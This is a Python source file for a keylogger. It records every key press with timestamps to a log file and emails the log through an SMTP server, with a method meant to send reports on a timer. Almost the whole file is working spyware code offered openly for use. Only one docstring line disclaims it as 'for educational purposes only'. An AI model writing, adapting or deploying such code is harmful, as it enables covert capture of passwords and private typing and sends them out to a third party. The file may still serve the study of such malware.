"""
Keylogger with Email Reporting

This script implements a basic keylogger with email reporting functionality. It uses the pynput library for keyboard monitoring and smtplib for sending email reports.

Usage:
1. Run the script, and the keylogger will start recording key presses.
2. Press 'Esc' to stop the keylogger.
3. The recorded keystrokes are saved in a log file ('keylogger_log.txt').
4. An email report containing the log file is sent to a specified email address.

Note: This script is for educational purposes only, and using it without proper authorization is illegal.

Dependencies:
- pynput
"""

from pynput import keyboard
from datetime import datetime
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import threading

class FileHandler:
    @staticmethod
    def clear_file(file_path):
        """
        Clears the contents of a file.

        :param file_path: Path of the file to be cleared.
        """
        try:
            with open(file_path, 'w') as file:
                file.truncate()
            print(f"The file {file_path} has been cleared.")
        except Exception as e:
            print(f"An error occurred: {e}")

    @staticmethod
    def read_file(file_path):
        """
        Reads the contents of a file.

        :param file_path: Path of the file to be read.
        :return: Contents of the file.
        """
        try:
            with open(file_path, 'r') as file:
                return file.read()
        except Exception as e:
            print(f"An error occurred while reading the file: {e}")
            return None

class EmailHandler:
    @staticmethod
    def send_email(sender_email, sender_password, recipient_email, subject, body):
        """
        Sends an email using SMTP.

        :param sender_email: Email address of the sender.
        :param sender_password: Password of the sender's email account.
        :param recipient_email: Email address of the recipient.
        :param subject: Subject of the email.
        :param body: Body of the email.
        """
        message = MIMEMultipart()
        message['From'] = sender_email
        message['To'] = recipient_email
        message['Subject'] = subject
        message.attach(MIMEText(body, 'plain'))

        smtp_server = "smtp-mail.outlook.com"
        smtp_port = 587

        with smtplib.SMTP(smtp_server, smtp_port) as server:
            server.starttls()
            server.login(sender_email, sender_password)
            server.sendmail(sender_email, recipient_email, message.as_string())

class KeyLogger(FileHandler, EmailHandler):
    def __init__(self, time_interval: int, log_file: str, sender_email, sender_password, recipient_email) -> None:
        print("KeyLogger has started...\nPress Esc to Exit")
        self.interval = time_interval
        self.log_file = log_file
        self.sender_email = sender_email
        self.sender_password = sender_password
        self.recipient_email = recipient_email
        self.log_start_time()

    def log_start_time(self):
        """
        Logs the start time of the keylogger.
        """
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self.append_to_log(f"Program started at {timestamp}\n")

    def on_press(self, key):
        """
        Callback function called when a key is pressed.

        :param key: The pressed key.
        :return: True if the key is logged, False otherwise.
        """
        try:
            current_key = str(key.char)
        except AttributeError:
            current_key = f" {key} " if key != keyboard.Key.esc else None

        if current_key is not None:
            self.append_to_log(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - {current_key}\n")

        return current_key is not None

    def append_to_log(self, string):
        """
        Appends a string to the log file.

        :param string: The string to be appended.
        """
        with open(self.log_file, 'a') as file:
            file.write(string)

    def log_end_time(self):
        """
        Logs the end time of the keylogger.
        """
        self.append_to_log(f"Program ended at {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")

    def send_log_email(self):
        """
        Sends the log file via email.
        """
        subject = "Keylogger Report"
        body = self.read_file(self.log_file)
        if body:
            self.send_email(self.sender_email, self.sender_password, self.recipient_email, subject, body)
        else:
            print("Failed to read log file. Email not sent.")

    def report_n_send(self) -> None:
        """
        Schedules periodic reporting and emailing of logs.
        """
        threading.Timer(self.interval, self.report_n_send).start()
        self.send_log_email()

    def start(self) -> None:
        """
        Starts the keylogger.
        """
        self.clear_file(self.log_file)
        keyboard.Listener(on_press=self.on_press).join()

if __name__ == "__main__":
    log_file_path = ""
    sender_email = ""
    sender_password = ""
    recipient_email = ""

    keylogger = KeyLogger(time_interval=10, log_file=log_file_path, sender_email=sender_email,
                          sender_password=sender_password, recipient_email=recipient_email)

    keylogger.start()
